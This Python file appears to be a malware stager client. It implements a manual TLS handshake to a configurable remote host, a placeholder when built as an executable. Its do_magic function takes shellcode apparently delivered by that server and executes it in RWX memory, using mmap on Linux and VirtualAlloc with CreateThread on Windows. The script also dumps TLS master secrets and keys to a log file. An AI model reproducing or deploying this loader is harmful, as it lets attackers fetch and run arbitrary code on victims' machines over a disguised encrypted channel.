import socket
import os
import struct
import hexdump
import hashlib
import hmac
import time
import sys

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from src.Parsers import *
from src.Generators import *
from src.Constants import *
from src.Utils import *

CURRENT_COLOR = "\033[94m"
END_COLOR = "\033[0m"


def do_magic(ctx):
    import ctypes
    print("Doing the magic 😈")
    shellcode = bytes.fromhex(ctx.SHELLCODE.hex())
    print(f"Shellcode: {shellcode.hex()[:10]}...")
    if os.name == "posix":
        # if client is linux
        import mmap
        # Allocate RWX memory
        mem = mmap.mmap(-1, len(shellcode),
                        flags=mmap.MAP_PRIVATE | mmap.MAP_ANON,
                        prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        # Copy shellcode into allocated memory
        mem.write(shellcode)
        # Cast memory to a function pointer
        func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_void_p.from_buffer(mem)))
        # Call it
        func()
    else:
        # it is windows
        # extremely straight forward shellcode execution mechanism
        ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
        rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
        handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
        ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
    return

if __name__ == "__main__":
    # Send just the ClientHello with shellcode
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if getattr(sys, 'frozen', False):
        # running from an executable
        host = "PLACEHOLDER"
        port = 8443
    else:
        host = sys.argv[1]
        port = int(sys.argv[2])
    sock.connect((host, port))


    ctx = Context()

    tls_msg_gen = TlsMessageGenerator(ctx)
    tls_parser = TlsParsers(ctx)

    # Step 1: Send ClientHello
    client_hello = tls_msg_gen.generate_client_hello()
    sock.sendall(client_hello)

    """
    import base64
    client_hello = base64.b64decode("FgMBAgABAAH8AwOmYanKxkuDnMKXRr8xKxVQdYnuYyNeUF4nvwH+fh8WZiD0fRlROUYMZBZl4EwjDYgAdMwF6sceD6KYXw9Q4RIEgwA+EwITAxMBwCzAMACfzKnMqMyqwCvALwCewCTAKABrwCPAJwBnwArAFAA5wAnAEwAzAJ0AnAA9ADwANQAvAP8BAAF1AAsABAMAAQIACgAWABQAHQAXAB4AGQAYAQABAQECAQMBBAAjAAAAFgAAABcAAAANACoAKAQDBQMGAwgHCAgICQgKCAsIBAgFCAYEAQUBBgEDAwMBAwIEAgUCBgIAKwAFBAMEAwMALQACAQEAMwAmACQAHQAgRADw06WgwfUgYWWopCgbI4DymEZXYrXuKZAYyDmvp14AFQDcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==")
    sock.sendall(client_hello)
    """
    CURRENT_COLOR = "\033[92m"
    records, handshake_messages = tls_parser.parse_tls_records(client_hello)
    ctx.HANDSHAKE_MESSAGES += handshake_messages
    print("[+] sent ClientHello")
    print("-"*60)

    
    CURRENT_COLOR = "\033[94m"
    # Step 2: Receive ServerHello and other following (potentially optional) handshake messages
    data = sock.recv(8192)
    records, handshake_messages = tls_parser.parse_tls_records(data)
    ctx.HANDSHAKE_MESSAGES += handshake_messages
    print("-"*60)
    
    # things so far
    """
    client -- ClientHello --> server
    server -- ServerHello --> client
    server -- Certificate --> client
    server -- ServerHelloDone --> client
    """

    # now we need to send the rest of the handshake messages
    """
    client -- ClientKeyExchange → server
    client -- ChangeCipherSpec → server
    client -- Finished → server (encrypted)
    server -- Finished → client (encrypted)

    """
    # Step 3: Send ClientKeyExchange
    client_key_exchange = tls_msg_gen.generate_client_key_exchange()
    sock.sendall(client_key_exchange)
    records, handshake_messages = tls_parser.parse_tls_records(client_key_exchange)
    ctx.HANDSHAKE_MESSAGES += handshake_messages

    print("[+] Client Key Exchange sent")
    print("-"*60)


    # Step 4: Send ChangeCipherSpec
    change_cipher_spec = tls_msg_gen.generate_change_cipher_spec()
    sock.sendall(change_cipher_spec)
    print("[+] ChangeCipherSpec sent")
    print("-"*60)
    records, change_cipher_spec_msg = tls_parser.parse_tls_records(change_cipher_spec)

    # Step 5: Send Finished
    hexdump.hexdump(ctx.HANDSHAKE_MESSAGES)
    ctx.CIPHER_NAME = ctx.get_cipher_suite_name_from_bytes(ctx.AGGREED_CIPHER_SUITE)
    ctx.IS_GCM = "GCM" in ctx.CIPHER_NAME
    print(f"Agreed on cipher suite: {ctx.AGGREED_CIPHER_SUITE.hex()} -> {ctx.CIPHER_NAME}") 
    print(f"IS_GCM: {ctx.IS_GCM}")
    ctx.ENCRYPT_RECORDS = True
    ctx.WRITE_SEQ = 0
    print(f"Client Random: {ctx.CLIENT_RANDOM.hex()}\nServer Random: {ctx.SERVER_RANDOM.hex()}")
    ctx.KEYS = expand_keys(ctx.PRE_MASTER_SECRET, ctx.CLIENT_RANDOM, ctx.SERVER_RANDOM)
    ctx.MASTER_SECRET = ctx.KEYS["master_secret"]

    """
    for k,v in ctx.KEYS.items():
        print(f"\t{k}: {v.hex()}")
    print(f"pre_master_secret: {ctx.PRE_MASTER_SECRET.hex()}")
    print(f"master_secret: {ctx.MASTER_SECRET.hex()}")
    print("|"*50)
    """

    # now everything after here is encrypted so we must pay attention to that
    finished = tls_msg_gen.generate_finished(ctx.MASTER_SECRET, ctx.HANDSHAKE_MESSAGES) # this is encrypted and includes verify data
    sock.sendall(finished)
    print("[+] Finished message sent")
    print("-"*60)

    # Step 8: Receive Server Finished
    data = sock.recv(4096)
    records, decrypted_server_finished = tls_parser.parse_tls_records(data)
    print("[+] Server Finished received")
    print("[+] Handshake completed!")
    print("-"*60)

    # print(f"\t\trecords -> {records}")
    # print(f"\t\tserver_finished -> {decrypted_server_finished}")
    
    # parse decrypted finished
    tls_parser.parse_tls_handshake_protocol(decrypted_server_finished)


    if 0:
        # Send an alert and check whether you've done the correct thing so far. 
        # 0x47 ->     Level=warning(1), description=insufficient security(71)
        alert = tls_msg_gen.generate_alert(level=1, description=0x47)  # warning, close_notify
        sock.sendall(alert)
        print("[+] Sent insufficient security alert")
        sys.exit(1)


    data = "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
    encrypted_application_data = tls_msg_gen.generate_application_data(data) # this is encrypted and includes verify data
    sock.sendall(encrypted_application_data)
    print("[+] Application Data sent")
    print("-"*60)

    data = sock.recv(4096)
    records, decrypted_application_data = tls_parser.parse_tls_records(data)
    
    
    print("\n\n\n")
    #hexdump.hexdump(application_data)
    print(decrypted_application_data.decode())
    
    do_magic(ctx)
    data = sock.recv(4096) # this will contain close_notify alert
    records, decrypted_alert = tls_parser.parse_tls_records(data)
    print("[+] Received close_notify alert")
    print("-"*60)

    alert = tls_msg_gen.generate_alert(level=1, description=0x00)  # warning, close_notify
    sock.sendall(alert)
    print("[+] Sent close_notify alert")
    print("-"*60)

    with open("ssl.log", "w") as f:
        f.write(f"MASTER_SECRET={ctx.MASTER_SECRET.hex()}\n")
        f.write(f"CLIENT_RANDOM={ctx.CLIENT_RANDOM.hex()}\n")
        f.write(f"SERVER_RANDOM={ctx.SERVER_RANDOM.hex()}\n")
        f.write(f"PRE_MASTER_SECRET={ctx.PRE_MASTER_SECRET.hex()}\n")
        f.write(f"ENCRYPTED_PRE_MASTER_SECRET={ctx.ENCRYPTED_PRE_MASTER_SECRET.hex()}\n")
        f.write(f"SERVER_PUBLIC_KEY={ctx.SERVER_PUBLIC_KEY_DER.hex()}\n")
        f.write(f"SERVER_PUBLIC_KEY_PEM={ctx.SERVER_PUBLIC_KEY_PEM}03")
        f.write(f"SERVER_PUBLIC_KEY_DER={ctx.SERVER_PUBLIC_KEY_DER.hex()}\n")
        for item in ctx.SERVER_CERTIFICATES:
            f.write(f"SERVER_CERTIFICATES={item.hex()}\n")
        for k,v in ctx.KEYS.items():
            f.write(f"{k}={v.hex()}\n")
        f.write(f"HANDSHAKE_MESSAGES={ctx.HANDSHAKE_MESSAGES.hex()}\n")

    #print(ctx.HANDSHAKE_MESSAGES)
    sock.close()
